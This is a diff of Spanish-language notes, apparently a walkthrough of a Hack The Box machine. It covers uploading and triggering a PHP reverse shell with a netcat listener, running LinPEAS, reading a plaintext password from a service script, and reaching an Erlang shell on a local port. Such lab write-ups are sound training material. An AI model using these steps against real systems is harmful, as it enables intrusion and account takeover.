@@ -20,14 +20,23 @@ Con esto nos creara un usuario `test::admin123`
 Accedemos a la web y en la parte de `Admin` en las opciones de usuario `User Option` nos encontramos diversos usuarios, seleccionamos a `ben` por que es un usuario raso y le cambiamos la contraseña.
 Iniciamos sesión como `ben` y subimos una Shell inversa en la carpeta `/webProd`
 
-Usaremos la siguiente shell `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`
+Usaremos la siguiente Shell `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`
 En el archivo tenemos que modificar la IP de escucha y el PUERTO
 
 En la maquina atacante nos ponemos en escucha por ese puerto con [[NETCAT]] con `nc -lnvp 1234`
 
 Ejecutamos la Shell con curl `curl http://soulmate.htb/shell.php`
 
-Y obtendremos una reverse shell como `ben`
+Y obtendremos una reverse Shell como `ben`
 
 ## Escalada de Privilegios
+Nos compartimos un `LinPEAS.sh` a la Shell obtenida y lo ejecutamos.
 
+Obtendremos una salida que nos indica que hay un servicio corriendo `/usr/local/lib/erlang_login/start.escript`
+Lo examinamos  `cat /usr/local/lib/erlang_login/start.escript`
+
+Vemos que están guardadas las contraseñas del usuario `ben::HouseH0ldings998` accedemos al usuario con `ssh ben@soulmate`
+
+Para la escala a root en el `LinPEAS.sh` encontramos un puerto `2222` abierto en el `localhost` accedemos a el desde el usuario `ben` con `ssh ben@localhost -p 2222`
+
+Obtendremos una Shell de Erlang
